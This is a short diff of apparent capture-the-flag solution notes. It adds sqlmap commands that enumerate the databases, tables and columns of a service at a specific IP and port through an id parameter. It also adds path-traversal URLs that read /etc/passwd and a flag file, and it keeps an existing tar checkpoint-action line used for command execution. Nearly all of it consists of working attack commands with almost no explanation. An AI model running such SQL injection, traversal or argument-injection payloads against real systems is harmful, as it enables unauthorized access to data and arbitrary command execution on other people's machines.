@@ -1,3 +1,14 @@
+small data leak:
+ip/user?id=
+sqlmap -u http://35.246.158.241:31089/user?id=1 --dbs
+sqlmap -u http://35.246.158.241:31089/user?id=1 --dbs
+sqlmap -u http://35.246.158.241:31089/user?id=1 -D db --tables
+sqlmap -u http://35.246.158.241:31089/user?id=1 -D db -T tb --columns
+
+file crawler:
+ip/local?image_name=..//..//..//etc/passwd
+ip/local?image_name=..////tmp/flag
+
 tartarsausage:
 cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="ls -l"
 
